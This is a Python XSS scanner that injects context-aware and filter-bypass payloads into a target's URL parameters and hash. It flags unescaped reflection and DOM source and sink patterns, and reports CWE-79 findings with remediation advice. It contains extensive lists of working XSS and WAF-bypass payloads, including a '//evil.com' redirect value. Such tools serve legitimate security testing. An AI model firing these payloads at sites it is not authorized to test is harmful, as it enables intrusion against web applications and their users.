#!/usr/bin/env python3
"""
Cross-Site Scripting (XSS) testing module with multiple detection techniques.

Usage:
    python xss_tester.py --target https://example.com/search?q=test --output results/
"""

import argparse
import asyncio
import html
import json
import re
import sys
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Dict, List, Optional, Set, Tuple
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse, quote

# Add parent to path for imports
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from core.http_client import AsyncHTTPClient, HTTPResponse
from core.result_manager import ResultManager, ScanResult, Finding, Severity
from core.payload_manager import PayloadManager
from core.utils import setup_logging, load_config, normalize_url, extract_domain, timestamp_now, ensure_dir

logger = setup_logging("xss_tester")


@dataclass
class XSSVulnerability:
    """Represents a discovered XSS vulnerability."""

    url: str
    parameter: str
    method: str
    xss_type: str  # reflected, stored, dom
    payload: str
    context: str  # html, attribute, javascript, url
    evidence: str
    confidence: str = "medium"
    filter_bypass: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url": self.url,
            "parameter": self.parameter,
            "method": self.method,
            "xss_type": self.xss_type,
            "payload": self.payload,
            "context": self.context,
            "evidence": self.evidence[:500] if self.evidence else "",
            "confidence": self.confidence,
            "filter_bypass": self.filter_bypass,
        }


class XSSTester:
    """
    Cross-Site Scripting vulnerability tester.

    Features:
    - Reflected XSS detection
    - Context-aware payload selection
    - Multiple encoding bypass techniques
    - DOM-based XSS detection
    - Filter/WAF bypass payloads
    """

    # Context detection patterns
    CONTEXT_PATTERNS = {
        "html_tag": r'<[^>]*{marker}[^>]*>',
        "html_body": r'>{marker}<',
        "attribute_double": r'="[^"]*{marker}[^"]*"',
        "attribute_single": r"='[^']*{marker}[^']*'",
        "attribute_unquoted": r'=\s*{marker}[\s>]',
        "javascript": r'<script[^>]*>[^<]*{marker}[^<]*</script>',
        "javascript_string_double": r'"[^"]*{marker}[^"]*"',
        "javascript_string_single": r"'[^']*{marker}[^']*'",
        "url_param": r'(?:href|src|action)=["\'][^"\']*{marker}',
        "event_handler": r'on\w+=["\'][^"\']*{marker}',
        "style": r'style=["\'][^"\']*{marker}',
        "comment": r'<!--[^>]*{marker}[^>]*-->',
    }

    # Basic XSS payloads
    BASIC_PAYLOADS = [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<body onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
    ]

    # Context-specific payloads
    CONTEXT_PAYLOADS = {
        "html_body": [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<body onload=alert(1)>',
            '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
        ],
        "attribute_double": [
            '" onmouseover="alert(1)',
            '" onfocus="alert(1)" autofocus="',
            '"><script>alert(1)</script>',
            '" onclick="alert(1)"',
            '"><img src=x onerror=alert(1)>',
        ],
        "attribute_single": [
            "' onmouseover='alert(1)",
            "' onfocus='alert(1)' autofocus='",
            "'><script>alert(1)</script>",
            "' onclick='alert(1)'",
        ],
        "javascript_string_double": [
            '";alert(1);//',
            '"-alert(1)-"',
            '";</script><script>alert(1)</script>',
            '"+alert(1)+"',
        ],
        "javascript_string_single": [
            "';alert(1);//",
            "'-alert(1)-'",
            "';</script><script>alert(1)</script>",
            "'+alert(1)+'",
        ],
        "url_param": [
            'javascript:alert(1)',
            'data:text/html,<script>alert(1)</script>',
            '//evil.com',
        ],
        "event_handler": [
            'alert(1)',
            'alert`1`',
            'alert(String.fromCharCode(49))',
        ],
    }

    # Filter bypass payloads
    BYPASS_PAYLOADS = [
        # Case variations
        '<ScRiPt>alert(1)</ScRiPt>',
        '<IMG SRC=x OnErRoR=alert(1)>',

        # Tag obfuscation
        '<script >alert(1)</script >',
        '<script\t>alert(1)</script>',
        '<script\n>alert(1)</script>',
        '<script/xss>alert(1)</script>',

        # Encoding bypasses
        '<script>alert(String.fromCharCode(88,83,83))</script>',
        '<img src=x onerror=alert&#40;1&#41;>',
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>',

        # Unicode bypasses
        '<script>alert\u0028\u0031\u0029</script>',
        '\u003cscript\u003ealert(1)\u003c/script\u003e',

        # Null byte injection
        '<scr\x00ipt>alert(1)</script>',
        '<img src=x onerror=alert\x00(1)>',

        # HTML entity bypasses
        '&lt;script&gt;alert(1)&lt;/script&gt;',  # Double encoding test
        '<img src=x onerror="&#x61;lert(1)">',

        # Alternative tags
        '<svg><script>alert&#40;1&#41;</script></svg>',
        '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
        '<isindex action=javascript:alert(1) type=image>',

        # Event handler variations
        '<img src=x onerror=alert`1`>',
        '<img src=x onerror=alert(1)// >',
        '<img src=x onerror=alert(1)/*>',

        # JavaScript protocol variations
        '<a href="&#106;avascript:alert(1)">click</a>',
        '<a href="java&#9;script:alert(1)">click</a>',
        '<a href="java&#10;script:alert(1)">click</a>',

        # Expression-based (older IE)
        '<div style="width:expression(alert(1))">',

        # Data URI
        '<object data="data:text/html,<script>alert(1)</script>">',
        '<embed src="data:text/html,<script>alert(1)</script>">',
    ]

    # DOM XSS sinks to look for
    DOM_SINKS = [
        r'\.innerHTML\s*=',
        r'\.outerHTML\s*=',
        r'\.insertAdjacentHTML\s*\(',
        r'document\.write\s*\(',
        r'document\.writeln\s*\(',
        r'eval\s*\(',
        r'setTimeout\s*\([^,]*[\'"`]',
        r'setInterval\s*\([^,]*[\'"`]',
        r'Function\s*\([\'"`]',
        r'\.src\s*=',
        r'\.href\s*=',
        r'location\s*=',
        r'location\.href\s*=',
        r'location\.assign\s*\(',
        r'location\.replace\s*\(',
    ]

    # DOM XSS sources
    DOM_SOURCES = [
        r'location\.search',
        r'location\.hash',
        r'location\.href',
        r'document\.URL',
        r'document\.documentURI',
        r'document\.referrer',
        r'window\.name',
        r'document\.cookie',
        r'localStorage\.',
        r'sessionStorage\.',
    ]

    def __init__(
        self,
        target: str,
        output_dir: str = "results",
        config: Optional[Dict] = None,
        proxy: Optional[str] = None,
        timeout: int = 30,
        threads: int = 10,
        test_params: Optional[List[str]] = None,
        methods: Optional[List[str]] = None,
        test_dom: bool = True,
        verbose: bool = False,
    ):
        self.target = normalize_url(target)
        self.target_domain = extract_domain(target)
        self.output_dir = Path(output_dir)
        self.config = config or {}
        self.proxy = proxy
        self.timeout = timeout
        self.threads = threads
        self.test_params = test_params
        self.methods = methods or ["GET"]
        self.test_dom = test_dom
        self.verbose = verbose

        self.vulnerabilities: List[XSSVulnerability] = []
        self.baseline_response: Optional[HTTPResponse] = None

        self.result_manager = ResultManager(output_dir)
        ensure_dir(self.output_dir)

    async def test(self) -> ScanResult:
        """Run XSS tests and return results."""
        result = ScanResult(
            tool="xss_tester",
            target=self.target,
            config={
                "timeout": self.timeout,
                "threads": self.threads,
                "methods": self.methods,
                "test_dom": self.test_dom,
            },
        )

        logger.info(f"Starting XSS testing for: {self.target}")

        try:
            # Parse target URL for parameters
            parsed = urlparse(self.target)
            params = parse_qs(parsed.query)

            if not params and not self.test_params:
                result.add_error("No parameters found in URL. Use --params to specify.")
                logger.warning("No parameters found in URL")
                result.finalize()
                return result

            # Use specified params or discovered params
            test_params = self.test_params or list(params.keys())
            logger.info(f"Testing parameters: {test_params}")

            # Get baseline response
            await self._get_baseline()

            # Test each parameter
            for param in test_params:
                logger.info(f"Testing parameter: {param}")

                # Detect context
                context = await self._detect_context(param)
                logger.info(f"Detected context: {context}")

                # Test reflected XSS
                await self._test_reflected(param, context)

                # Test with bypass payloads
                await self._test_bypass_payloads(param)

            # Test for DOM XSS
            if self.test_dom:
                await self._test_dom_xss()

            # Calculate statistics
            result.stats = {
                "parameters_tested": len(test_params),
                "vulnerabilities_found": len(self.vulnerabilities),
                "by_type": self._count_by_type(),
                "by_context": self._count_by_context(),
            }

            # Add findings
            for vuln in self.vulnerabilities:
                severity = Severity.HIGH
                if vuln.confidence == "high":
                    severity = Severity.HIGH
                elif vuln.confidence == "low":
                    severity = Severity.MEDIUM

                result.add_finding(Finding(
                    title=f"XSS ({vuln.xss_type}): {vuln.parameter}",
                    severity=severity,
                    description=f"{vuln.xss_type.title()} XSS in parameter '{vuln.parameter}' ({vuln.context} context)",
                    url=vuln.url,
                    parameter=vuln.parameter,
                    payload=vuln.payload,
                    evidence=vuln.evidence,
                    metadata={
                        "xss_type": vuln.xss_type,
                        "context": vuln.context,
                        "confidence": vuln.confidence,
                        "filter_bypass": vuln.filter_bypass,
                    },
                    cwe_id="CWE-79",
                    remediation="Encode output based on context (HTML, JavaScript, URL, CSS). Use Content-Security-Policy headers.",
                ))

        except Exception as e:
            result.add_error(f"Testing error: {e}")
            logger.error(f"Testing error: {e}")

        result.finalize()
        return result

    async def _get_baseline(self):
        """Get baseline response."""
        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
        ) as client:
            self.baseline_response = await client.get(self.target)

    async def _detect_context(self, param: str) -> str:
        """Detect the context where parameter value is reflected."""
        marker = f"XSS{hash(param) % 10000}TEST"

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
        ) as client:
            url = self._inject_payload(param, marker)
            response = await client.get(url)

            if marker not in response.body:
                return "none"

            # Check each context pattern
            for context, pattern in self.CONTEXT_PATTERNS.items():
                regex = pattern.replace("{marker}", re.escape(marker))
                if re.search(regex, response.body, re.IGNORECASE):
                    return context

            return "html_body"  # Default if reflected but context unclear

    async def _test_reflected(self, param: str, context: str):
        """Test for reflected XSS."""
        logger.info(f"Testing reflected XSS for: {param} (context: {context})")

        # Get context-specific payloads
        payloads = self.CONTEXT_PAYLOADS.get(context, self.BASIC_PAYLOADS)

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            for payload in payloads:
                url = self._inject_payload(param, payload)

                try:
                    response = await client.get(url)

                    # Check if payload is reflected unescaped
                    if self._is_payload_executed(payload, response.body):
                        vuln = XSSVulnerability(
                            url=self.target,
                            parameter=param,
                            method="GET",
                            xss_type="reflected",
                            payload=payload,
                            context=context,
                            evidence=self._extract_evidence(payload, response.body),
                            confidence="high",
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found reflected XSS: {param}")

                        if self.verbose:
                            logger.debug(f"Payload: {payload}")

                        return  # Found, stop testing this param with these payloads

                except Exception as e:
                    logger.debug(f"Error testing payload: {e}")

    async def _test_bypass_payloads(self, param: str):
        """Test with filter bypass payloads."""
        logger.info(f"Testing XSS bypass payloads for: {param}")

        # Check if basic payloads were filtered
        basic_blocked = await self._is_basic_blocked(param)

        if not basic_blocked:
            return  # Basic payloads work, no need for bypasses

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
            max_retries=1,
        ) as client:
            for payload in self.BYPASS_PAYLOADS:
                url = self._inject_payload(param, payload)

                try:
                    response = await client.get(url)

                    if self._is_payload_executed(payload, response.body):
                        vuln = XSSVulnerability(
                            url=self.target,
                            parameter=param,
                            method="GET",
                            xss_type="reflected",
                            payload=payload,
                            context="bypass",
                            evidence=self._extract_evidence(payload, response.body),
                            confidence="high",
                            filter_bypass="yes",
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info(f"Found XSS with filter bypass: {param}")
                        return

                except Exception as e:
                    logger.debug(f"Error testing bypass payload: {e}")

    async def _is_basic_blocked(self, param: str) -> bool:
        """Check if basic XSS payloads are blocked."""
        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
        ) as client:
            payload = "<script>alert(1)</script>"
            url = self._inject_payload(param, payload)
            response = await client.get(url)

            # Check if payload is filtered/encoded
            return payload not in response.body and html.escape(payload) in response.body

    async def _test_dom_xss(self):
        """Test for DOM-based XSS vulnerabilities."""
        logger.info("Testing for DOM XSS...")

        if not self.baseline_response:
            return

        body = self.baseline_response.body

        # Look for DOM sinks
        sinks_found = []
        for sink_pattern in self.DOM_SINKS:
            if re.search(sink_pattern, body, re.IGNORECASE):
                sinks_found.append(sink_pattern)

        # Look for DOM sources
        sources_found = []
        for source_pattern in self.DOM_SOURCES:
            if re.search(source_pattern, body, re.IGNORECASE):
                sources_found.append(source_pattern)

        # If both sources and sinks found, potential DOM XSS
        if sinks_found and sources_found:
            vuln = XSSVulnerability(
                url=self.target,
                parameter="DOM",
                method="GET",
                xss_type="dom",
                payload="N/A - Manual verification required",
                context="javascript",
                evidence=f"Sources: {sources_found[:3]}, Sinks: {sinks_found[:3]}",
                confidence="low",
            )
            self.vulnerabilities.append(vuln)
            logger.info("Potential DOM XSS detected")

        # Test hash-based DOM XSS
        await self._test_hash_xss()

    async def _test_hash_xss(self):
        """Test for hash-based DOM XSS."""
        payloads = [
            "#<script>alert(1)</script>",
            "#<img src=x onerror=alert(1)>",
            "#javascript:alert(1)",
        ]

        async with AsyncHTTPClient(
            timeout=self.timeout,
            proxy=self.proxy,
        ) as client:
            for payload in payloads:
                url = f"{self.target}{payload}"
                try:
                    response = await client.get(url)

                    # Check if payload appears in response (some frameworks reflect hash)
                    clean_payload = payload[1:]  # Remove #
                    if clean_payload in response.body:
                        vuln = XSSVulnerability(
                            url=self.target,
                            parameter="hash",
                            method="GET",
                            xss_type="dom",
                            payload=payload,
                            context="hash",
                            evidence=f"Hash value reflected in response",
                            confidence="medium",
                        )
                        self.vulnerabilities.append(vuln)
                        logger.info("Found hash-based DOM XSS")
                        return

                except Exception as e:
                    logger.debug(f"Error testing hash XSS: {e}")

    def _inject_payload(self, param: str, payload: str) -> str:
        """Inject payload into parameter."""
        parsed = urlparse(self.target)
        params = parse_qs(parsed.query)

        params[param] = [payload]

        new_query = urlencode(params, doseq=True)
        return urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, new_query, parsed.fragment
        ))

    def _is_payload_executed(self, payload: str, body: str) -> bool:
        """Check if XSS payload would execute."""
        # Check for unescaped reflection
        if payload in body:
            # Verify it's not in a safe context
            escaped_variants = [
                html.escape(payload),
                payload.replace("<", "&lt;").replace(">", "&gt;"),
                quote(payload),
            ]
            for escaped in escaped_variants:
                if escaped in body and payload not in body.replace(escaped, ""):
                    return False
            return True

        # Check for partial reflection that could execute
        # Script tag present
        if "<script" in payload.lower():
            if "<script" in body.lower() and "alert" in body:
                return True

        # Event handler present
        event_match = re.search(r'on\w+=', payload, re.IGNORECASE)
        if event_match:
            event = event_match.group(0)
            if event.lower() in body.lower():
                return True

        return False

    def _extract_evidence(self, payload: str, body: str) -> str:
        """Extract evidence of XSS from response."""
        # Find where payload appears
        idx = body.find(payload)
        if idx >= 0:
            start = max(0, idx - 50)
            end = min(len(body), idx + len(payload) + 50)
            return body[start:end]

        # Try to find partial match
        if "<script" in payload.lower():
            match = re.search(r'<script[^>]*>[^<]{0,100}', body, re.IGNORECASE)
            if match:
                return match.group(0)

        return "Payload reflected in response"

    def _count_by_type(self) -> Dict[str, int]:
        """Count vulnerabilities by type."""
        counts: Dict[str, int] = {}
        for vuln in self.vulnerabilities:
            counts[vuln.xss_type] = counts.get(vuln.xss_type, 0) + 1
        return counts

    def _count_by_context(self) -> Dict[str, int]:
        """Count vulnerabilities by context."""
        counts: Dict[str, int] = {}
        for vuln in self.vulnerabilities:
            counts[vuln.context] = counts.get(vuln.context, 0) + 1
        return counts

    def save_results(self, result: ScanResult) -> Dict[str, str]:
        """Save results to files."""
        paths = self.result_manager.save(result, f"xss_{self.target_domain}")

        # Save vulnerabilities JSON
        vuln_path = self.output_dir / f"xss_vulns_{self.target_domain}.json"
        with open(vuln_path, "w") as f:
            json.dump(
                {
                    "target": self.target,
                    "timestamp": timestamp_now(),
                    "vulnerabilities": [v.to_dict() for v in self.vulnerabilities],
                },
                f,
                indent=2,
            )
        paths["vulnerabilities"] = str(vuln_path)

        return paths


async def main():
    parser = argparse.ArgumentParser(
        description="Cross-Site Scripting (XSS) vulnerability tester"
    )
    parser.add_argument("-t", "--target", required=True, help="Target URL with parameters")
    parser.add_argument("-o", "--output", default="results", help="Output directory")
    parser.add_argument("-c", "--config", help="Config file path")
    parser.add_argument("-p", "--proxy", help="Proxy URL")
    parser.add_argument("--threads", type=int, default=10, help="Concurrent threads")
    parser.add_argument("--timeout", type=int, default=30, help="Request timeout")
    parser.add_argument("--params", help="Parameters to test (comma-separated)")
    parser.add_argument("--no-dom", action="store_true", help="Skip DOM XSS testing")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")

    args = parser.parse_args()

    config = {}
    if args.config:
        config = load_config(args.config)

    test_params = args.params.split(",") if args.params else None

    tester = XSSTester(
        target=args.target,
        output_dir=args.output,
        config=config,
        proxy=args.proxy,
        timeout=args.timeout,
        threads=args.threads,
        test_params=test_params,
        test_dom=not args.no_dom,
        verbose=args.verbose,
    )

    result = await tester.test()
    paths = tester.save_results(result)

    print(f"\n{'='*60}")
    print(f"XSS Testing Complete: {args.target}")
    print(f"{'='*60}")
    print(f"Vulnerabilities Found: {len(tester.vulnerabilities)}")
    print(f"By Type: {result.stats.get('by_type', {})}")
    print(f"By Context: {result.stats.get('by_context', {})}")
    print(f"\nResults saved to:")
    for name, path in paths.items():
        print(f"  {name}: {path}")

    if tester.vulnerabilities:
        print(f"\n*** VULNERABILITIES FOUND ***")
        for vuln in tester.vulnerabilities:
            print(f"  [{vuln.confidence.upper()}] {vuln.xss_type}: {vuln.parameter} ({vuln.context})")


if __name__ == "__main__":
    asyncio.run(main())
